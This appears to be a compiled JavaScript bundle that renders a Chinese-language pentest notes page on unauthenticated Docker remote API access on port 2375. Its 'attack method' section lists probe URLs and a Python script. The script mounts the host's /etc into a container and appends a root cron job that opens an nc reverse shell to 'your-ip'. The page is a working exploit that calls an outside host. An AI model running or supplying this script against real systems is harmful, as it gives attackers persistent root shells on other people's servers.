(window.webpackJsonp=window.webpackJsonp||[]).push([[313],{1081:function(s,t,a){s.exports=a.p+"assets/img/1629509264213-4a39c72c-ce8c-42f4-af15-997bd7f86be6.692e7865.png"},1082:function(s,t,a){s.exports=a.p+"assets/img/1629509794103-4c27e6d1-8c28-441a-9b26-0f5326506451.68334bfc.png"},3009:function(s,t,a){"use strict";a.r(t);var e=a(68),r=Object(e.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"docker-2375端口"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#docker-2375端口"}},[s._v("#")]),s._v(" Docker 2375端口")]),s._v(" "),t("h2",{attrs:{id:"关于"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#关于"}},[s._v("#")]),s._v(" 关于")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("该未授权访问漏洞是因为 Docker remote api 可执行docker命令，获取信息")]),t("br"),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("从官方文档可以看出，该接口是目的是取代docker 命令界面，通过url操作docker。")]),t("br"),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("而Docker swarm是docker下的分布化应用的本地集群，在开放2375监听集群容器时，就会调用这个api")]),t("br"),s._v(" "),t("h2",{attrs:{id:"攻击方法"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#攻击方法"}},[s._v("#")]),s._v(" 攻击方法")]),s._v(" "),t("p",[s._v("访问目标，验证未授权API调用")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("http://xxx.xxx.xxx.xxx:2375/version\nhttp://xxx.xxx.xxx.xxx:2375/containers/json\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[t("img",{attrs:{src:a(1081),alt:"img"}})]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("使用 Python脚本调用API 反弹Shell")]),t("br"),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("import")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker")]),s._v("\n\nclient "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" docker.DockerClient"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("base_url"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'http://Remote-IP:2375/'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndata "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" client.containers.run"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'alpine:latest'")]),s._v(", r"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),s._v("'sh "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root\"")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),s._v("', "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("remove")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("True, "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("volumes")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/etc'")]),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'bind'")]),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/tmp/etc'")]),s._v(", "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'mode'")]),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'rw'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("p",[t("img",{attrs:{src:a(1082),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=r.exports}}]);